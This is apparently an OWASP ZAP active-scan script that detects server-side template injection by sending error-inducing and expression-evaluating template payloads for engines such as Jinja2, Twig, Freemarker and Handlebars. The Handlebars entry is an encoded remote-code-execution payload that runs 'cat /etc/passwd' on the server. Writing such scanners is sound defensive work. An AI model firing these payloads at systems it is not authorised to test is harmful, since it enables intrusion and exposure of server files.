/**
 * Made with ❤️ by Astra Security (https://www.getastra.com/)
 * @author: Karthik UJ (karthik.uj@getastra.com)
 * Version: 1.0
 */

// Labs: https://portswigger.net/web-security/all-labs#server-side-template-injection
// More simple web apps made with SSTI vulnerable template engines: https://github.com/DiogoMRSilva/websitesVulnerableToSSTI

// Import Logger
var LoggerManager = Java.type("org.apache.logging.log4j.LogManager");
var log = LoggerManager.getLogger("SSTI");

var ScanRuleMetadata = Java.type(
  "org.zaproxy.addon.commonlib.scanrules.ScanRuleMetadata"
);

function getMetadata() {
  return ScanRuleMetadata.fromYaml(`
id: 100033
name: Server Side Template Injection
description: >
  Server Side Template Injection (SSTI) occurs when user input is directly embedded into the template without any
  proper sanitization, a hacker can use this vulnerability to inject malicious code and try to achieve remote code execution.
solution: >
  Always use proper functions provided by the template engine to insert data,
  if that is not possible try to sanitize user input as efficiently as possible.
references:
  - https://portswigger.net/research/server-side-template-injection
category: injection
risk: high
confidence: medium
cweId: 20  # CWE-20: Improper Input Validation
wascId: 20  # WASC-20: Improper Input Handling
alertTags:
  ${CommonAlertTag.OWASP_2021_A03_INJECTION.getTag()}: ${CommonAlertTag.OWASP_2021_A03_INJECTION.getValue()}
  ${CommonAlertTag.OWASP_2017_A01_INJECTION.getTag()}: ${CommonAlertTag.OWASP_2017_A01_INJECTION.getValue()}
  ${CommonAlertTag.WSTG_V42_INPV_18_SSTI.getTag()}: ${CommonAlertTag.WSTG_V42_INPV_18_SSTI.getValue()}
status: alpha
codeLink: https://github.com/zaproxy/community-scripts/blob/main/active/SSTI.js
helpLink: https://www.zaproxy.org/docs/desktop/addons/community-scripts/
`);
}

function logger() {
  print("[" + this["zap.script.name"] + "] " + arguments[0]);
  log.debug("[" + this["zap.script.name"] + "] " + arguments[0]);
}

function scan(as, msg, param, value) {
  logger(
    "scan called for url=" +
      msg.getRequestHeader().getURI().toString() +
      " param=" +
      param +
      " value=" +
      value
  );

  // Copy requests before reusing them
  var sstiFuzzMessage = msg.cloneRequest();

  // Check if the scan was stopped before performing lengthy tasks
  if (as.isStop()) {
    return;
  }

  // Fuzz for SSTI and detect template engine in use by inducing errors
  sstiFuzzEngineErrorDetect(as, sstiFuzzMessage, param);

  // Fuzz for SSTI and detect template engine in use by evaluating an expression
  sstiFuzzEngineMathDetect(as, sstiFuzzMessage, param);
}

function sstiFuzzEngineErrorDetect(as, msg, param) {
  logger("SSTI Error Based Engine Detection Started...");

  // Attacks for generating errors to detect the template engine being used
  // We are using two types of errors mostly, because sometimes some types of errors are handled without output
  // a) Undeclared variable
  // b) Division by zero
  var errorGenerateAttacks = [
    "<%= foobar %>", // ruby erb
    "<%= 7/0 %>", // ruby erb
    "{{1/0}}", // tornado / handlebars / twig / django
    "{{foobar}}", // tornado / twig
    "{{ errorProduce(sumthin) }}", // twig
    "${foobar}", // freemarker
    "${7/0}", // freemarker
    "{#foobar}", // dust
    "#{foobar}", // ruby slim
    "#{7/0}", //ruby slim
    "{% foobar %}", // django
    '#include( "nonone.txt" )', // velocity
    "${{<%[%'\"}}%.", // SSTI polyglot
  ];

  for (var i = 0; i < errorGenerateAttacks.length; i++) {
    var err = errorGenerateAttacks[i];

    // Copy requests before reusing them
    var fuzzMsg = msg.cloneRequest();

    // setParam (message, parameterName, newValue)
    as.setParam(fuzzMsg, param, err);

    // sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
    as.sendAndReceive(fuzzMsg, false, false);
    var respBody = fuzzMsg.getResponseBody().toString();

    // Possible template engines
    var templateEngines = [
      "jinja",
      "django",
      "tornado",
      "erb",
      "freemarker",
      "handlebars",
      "velocity",
      "twig",
      "dot",
      "dust",
      "smarty",
      "mako",
      "Slim",
      "ejs",
      "Infinity",
      "INF",
    ];

    for (var j = 0; j < templateEngines.length; j++) {
      var engine = templateEngines[j];
      if (respBody.indexOf(engine) != -1) {
        logger("Server Side Template Injection Found! Raising Alert...");
        raiseAlert(as, fuzzMsg, err, engine, 2, param, engine);
        logger("SSTI Error Based Engine Detection Completed.");
        return;
      }
    }
  }

  logger("SSTI Error Based Engine Detection Completed.");
}

function sstiFuzzEngineMathDetect(as, msg, param) {
  logger("SSTI Expression Evaluation Based Engine Detection Started...");

  // Attacks for injecting an expression and checking the response to see if it got evaluated
  var equationExecuteAttacks = {
    "ERB/EJS": ["<%= 9*1371742 %>", "12345678"], // outputs 12345678
    Jinja2: ["{{8*'7'}}", "77777777"], // Outputs 77777777
    Smarty: ["{9*1371742}", "12345678"], // Outputs 12345678
    "Tornado/Twig/Nunjucks/Vue.js/Smarty": ["{{9*1371742}}", "12345678"], //outputs 12345678
    Freemarker: ["${9*1371742}", "12,345,678"], // Outputs 12,345,678
    Mako: ["${9*1371742}", "12345678"], // Outputs 12345678
    Handlebars: [
      "%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%53%79%6e%63%28%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d",
      "/bin/bash",
    ], // Check for /bin/bash in output
    velocity: ["#set ($run=9*1371742) $run", "12345678"], // outputs 12345678
    Velocity: ["#{set} ($run=9*1371742) $run", "12345678"], // In case 'set' is blacklisted in velocity circumvent like this, outputs 12345678
    django: ["{% widthratio 9 1 1371742 %}", "12345678"], // outputs 12345678
    Django: ["{% debug %}", "django"], // Check output for "django"
    Dot: ["{{=9*1371742}}", "12345678"], //Outputs 12345678
    Dust: ['{@math key="9" method="multiply" operand="1371742"/}', "12345678"], // Outputs 12345678
    "Slim/Jade": ["#{9*1371742}", "12345678"], // Outputs 12345678
  };

  for (var i in equationExecuteAttacks) {
    // Copy requests before reusing them
    var fuzzMsg = msg.cloneRequest();

    // Set payload and evidence
    var payload = equationExecuteAttacks[i][0];
    var evidence = equationExecuteAttacks[i][1];

    // setParam (message, parameterName, newValue)
    as.setParam(fuzzMsg, param, payload);

    // sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
    as.sendAndReceive(fuzzMsg, false, false);
    var respBody = fuzzMsg.getResponseBody().toString();

    if (respBody.indexOf(evidence) != -1) {
      logger("Server Side Template Injection Found! Raising Alert...");
      raiseAlert(as, fuzzMsg, payload, evidence, 3, param, i);
      logger("SSTI Expression Evaluation Based Engine Detection Completed.");
      return;
    }
  }

  logger("SSTI Expression Evaluation Based Engine Detection Completed.");
}

function raiseAlert(as, msg, payload, evidence, confidence, param, engine) {
  var badErrors = ["Infinity", "INF"];

  //Alert variables
  var alertName = "Server Side Template Injection";
  if (badErrors.indexOf(engine) == -1) {
    alertName += " - " + toTitleCase(engine);
  }

  as.newAlert()
    .setConfidence(confidence)
    .setName(alertName)
    .setParam(param)
    .setAttack(payload)
    .setEvidence(evidence)
    .setMessage(msg)
    .raise();
}

function toTitleCase(str) {
  return str.replace(/\w\S*/g, function (txt) {
    return txt.charAt(0).toUpperCase() + txt.substr(1).toLowerCase();
  });
}
